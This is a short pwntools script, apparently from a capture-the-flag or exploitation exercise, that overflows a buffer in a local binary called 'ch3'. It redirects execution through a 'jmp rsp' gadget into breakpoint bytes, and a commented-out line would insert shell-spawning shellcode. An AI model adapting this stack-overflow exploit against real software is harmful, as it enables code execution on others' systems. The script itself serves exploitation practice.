from pwn import *

r = process("./ch3")
context.binary = './ch3'
context.terminal = '/usr/local/bin/hyperpwn-client.sh'

# attach gdb and continue
gdb.attach(r.pid, """c""")

gadget = 0x0000000000401126 # jmp rsp

payload = ("A"*16+"B"*8).encode('utf-8')
payload += p64(gadget) # return address, p64 converts our address to little endian because that's the correct representation in memory
# \xcc -> is a software breakpoint (int3). If our redirection of the execution worked, we should break
payload += ("\xcc"*100).encode('utf-8')
#payload += asm(shellcraft.sh())

r.sendline(payload)
r.interactive()